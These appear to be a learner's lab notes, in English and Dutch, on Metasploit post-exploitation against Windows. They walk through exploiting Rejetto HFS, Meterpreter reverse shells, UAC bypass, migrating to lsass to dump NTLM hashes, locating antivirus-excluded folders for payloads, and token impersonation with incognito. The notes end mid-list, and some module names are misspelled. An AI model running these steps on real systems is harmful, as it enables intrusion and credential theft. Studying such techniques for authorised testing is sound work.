- MSF provides us with post exploitation modules 
![[Pasted image 20230828081111.png]]

#### the basics - post exploitation modules 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip `
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
6) Meterpreter session 
	1) `sysinfo` 
	2) `getuid`
	3) `help` a meterpreter session on windows gives you more options
	4) `getsystem` can be used to elevate privileges 
	5) `show_mount` will display drives 
	6) `ps` 
	7) `migrate 2212` (you can migrate to upgrade your meterpreter session to x64 )
	8) `cd C:\\` and  `dir` 
7) upgrade the architecture:  x86 Meterpreter sessions are used on 32-bit systems and offer limited access to system resources, while x64 Meterpreter sessions are used on 64-bit systems and provide greater access to resources and system components.  
	- `search migrate`
	- `use post/windows/manage/migrate` (create new process and migrate to it)
	- `set session 1 `


**Target and Payload Mismatch:** The architecture of the target system (x64) doesn't match the architecture of the Meterpreter payload (x86/windows). This means that the payload you used to establish the Meterpreter session was designed for 32-bit Windows systems (x86), but it was executed on a 64-bit Windows system (x64). This can lead to compatibility issues because 32-bit payloads might not work properly or have limited functionality on 64-bit systems.



##### post exploitation modules for windows: 
- `post/windows/gather/win_privs` will enumerate the priviliges of current user we have access to.  
	1) set session  

- `post/windows/gather/enum_logged_on_users` allows us to see what users are currently logged on 
	1) set session  

- `post/windows/gather/checkvm` will tell you if the target system is a virtual machine. If you find out that you are on a virtual machine than you can look into exploit modules to break out of the virtual machine and gain access to host operating system that is hosting the virtual machine. 
	- set session

- `post/windows/gather/enum_applications` will tell us what programs are installed on target system (you can check if the applications are vulnerable - if they are you can use that to elevate your priviliges )

- `loot`  will show you were the results of the modules run is stored 

- `post/windows/gather/enum_av_ecluded`  what folders are not scanned by anti-virus. This is handy because in these folders you can store your exploit code and payloads that you want to transfer to the target and execute on disk without being caught 

-  `post/windows/gather/enum_computers` enumerate computers that are part of the domain that the target is also part of

-  `post/windows/gather/enum_patces`  enumerate installed patches on target system
	- if this does not work: go into session -> `shell` this will give you command prompt -> `systeminfo`
	
- `post/windows/gather/enum_shares` enumerate shares 


-  `post/windows/manage/enabled_rdp` enable rdp on target - it will tell you if rdp is already enabled. 


### Windows Privilege Escalations: Bypassing UAC 

- UAC is a Windows security feature introduced in Windows vista that is used to prevent unauthorized changes from being made to the operating system 
![[Pasted image 20230828134513.png]]
- UAC is used to ensure that changes to the operating system require approval from administrator.
- We can utilize the "windows Escalate UAC Protection Bypass (in Memory Injection)" module to bypass UAC by utilizing the trusted publisher certificate through process injection. it will spawn a second shell that has the UAC flag turned off 
- need 64 bit meterpreter session (set payload)
- We are going to bypass UAC using the Metasploit local exploit module. â€œThis module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip 
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
	1) set the payload to the 64-bit meterpreter payload because that is what will be required in order to successfully bypass UAC and elevate our priviliges: `set payload windows/x64/meterpreter/reverse_tcp`
6) `sysinfo`  `getuid` (admin not the same as administrator)
7) Try elevate priviliges: `getsystem`
	1) migrate to another process such as explorer.exe) and try the above command again 
8) what are the priviliges assigned to current user: `getprivs`
9) find out to which group users belongs: 
	1) open shell session: `shell` 
	2) list all user accounts that exist on the local computer: ` net users` 
	3) enumerate users part of group administrators: `net localgroup administrators `
	            if admin is part of administrator group than that means that de admin account can make changes to operating system and do administrative tasks. 
	4) terminate this shell 
10) put meterpreter session in the background
11) bypass UAC:
	1) `use exploit/windows/local/bypassuac_injection `
	2) `set payload windows/x64/meterpreter/reverse_tcp` 
	3) `set TARGET 1` 
	4)  set session` id 
	5) `set` `lport` 
	6) when error:` set TARGET Windows x64 `
	7) `getuid` when you see your privileges are not elevated (you till admin) than use command: `getsystem`. The `getsystem` command in the beginning did not work due to UAC but now that UAC is disabled the command `getsystem` will be able to elevate your priviliges. 
11) migrate to Lsass.exe process 
12) `hashdump` to get the hashes (ntlm hash is 4th field)

### Windows Privilege Escalation: Token Impersonation with Incognito 

- Windows access tokens are a core element of the authentication process on Windows and are created by the Local Security Authority Subsystem Service (LSASS) 
- A windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed 
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identify and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token. 

Een **Windows-toegangstoken** is als een **tijdelijke sleutel** die de beveiligingscontext van een process of thread op een systeem identificeert en beschrijft. Vergelijk het met een webcookie dat gebruikers toegang geeft tot een systeem of netwerkbron zonder telkens inloggegevens te hoeven opgeven wanneer een process wordt gestart of een systeembron wordt benaderd. 

Zonder Windows toegang tokens zou je bij elk programma (met permissions and privileges) je wachtwoord moeten invoeren. 

Toegangstokens worden gegenereerd door het process *winlogon.exe* telkens wanneer een gebruiker succesvol inlogt. *Ze bevatten de identiteit en rechten van het gebruikersaccount dat aan de thread of het process is gekoppeld.* Dit token wordt vervolgens gekoppeld aan het process *userinit.exe*. Alle child processe die door een gebruiker worden gestart, erven een kopie van het toegangstoken van hun parent process en worden uitgevoerd met dezelfde rechten als dat toegangstoken. Dit maakt het mogelijk om soepel met systeembronnen om te gaan zonder voortdurend inloggegevens te hoeven verstrekken.

#####  How are they sorted? 

- Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token
- An access token will typically be assigned one of the following security levels: 
	- **impersonate-level tokens** are created as a direct result of a **non-interactive login** on Windows, typically through specific system services or domain logons. 
		- Een niet-interactieve aanmelding gebeurt meestal automatisch, zonder dat een gebruiker fysieke interactie heeft met het systeem. Dit kan gebeuren via systeemdiensten, geplande taken of netwerktoegang.

	- **Delegate-level tokens** are typically created through an **interactive login** on Windows primarily though a traditional login or through remote access protocols such as RDP 
		- Bij een interactieve aanmelding voert een gebruiker rechtstreeks informatie in om toegang te krijgen tot een systeem, zoals een gebruikersnaam en wachtwoord
		  
- Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems 
- Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system. 

Impersonate-level tokens worden meestal aangemaakt als gevolg van een **niet-interactieve aanmelding** op Windows, meestal via specifieke systeemdiensten of domeinaanmeldingen. Stel je voor dat dit een soort "tijdelijk pasje" is dat je toegang geeft tot bepaalde ruimtes binnen een gebouw, maar alleen binnen dat gebouw zelf.

Aan de andere kant worden Delegate-level tokens typisch gemaakt bij een **interactieve aanmelding** op Windows, zoals een traditionele aanmelding of via externe toegangsprotocollen zoals RDP (Remote Desktop Protocol). Deze tokens zijn als een krachtiger pasje waarmee je niet alleen toegang hebt tot ruimtes binnen het ene gebouw, maar ook tot ruimtes in andere gebouwen.

Dus, het belangrijkste verschil is dat Impersonate-level tokens alleen toegang geven tot lokale resources op hetzelfde systeem, terwijl Delegate-level tokens gevaarlijker zijn omdat ze toegang kunnen geven tot resources op andere systemen, waardoor ze een potentieel groter risico vormen


##### Hoe exploiten?

- The process of impersonating access tokens to elevate privilege's on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available 
  
- the following are the privileges that are required for a successful impersonation attack: 
	- **SeAssignPrimaryToken** ----> this allows a user to impersonate tokens 
	- **SeCreateToken**: ----> this allows a user to create an arbitrary token with administrative privileges 
	- **SelmpersonatePrivilege** ---> this allows a user to create a process under the security context of another user typically with administrative privileges 

##### The incognito module 

- the incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation
- we can use the incognito module to display a list of available tokens that we can impersonate 

--

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip 
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
	1) set the payload to the 64-bit meterpreter payload because that is what will be required in order to successfully bypass UAC and elevate our priviliges: `set payload windows/x64/meterpreter/reverse_tcp`
	2) target uri is the root of the webserver (check by visiting the ip)
6) `sysinfo`  `getuid` (admin not the same as administrator)

	NT AUTHORITY\\LOCAL SERVICE is different from NT AUTHORITY\\ SYSTEM 
	`NT AUTHORITY\LOCAL SERVICE` is a Windows account with lower privileges, typically used for running system services with limited access. It means we have privliges associated with local service account. The reason you have this is bc you exploited a service (e.g. rejetto httpfileserver service )
	`NT AUTHORITY\SYSTEM` is a highly privileged account with full control over the system, used for critical system-level task


7) `getprivs`
   ![[Pasted image 20230829114819.png]]
   you need at least one of the following priviliges to do token impersonation: *SeAssignPrimaryToken, SeCreateToken, SelmpersonatePrivilege*

8) verify if you have administrative privileges: 
	1) you can test your privileges with `hashdump` because it requires administrative privileges.  
	2) Try to navigate to administrators user directory:` cd C:\\ cd Users cd Administrators `
	   
9) utilize the incognito module: `load incognito` 
10) 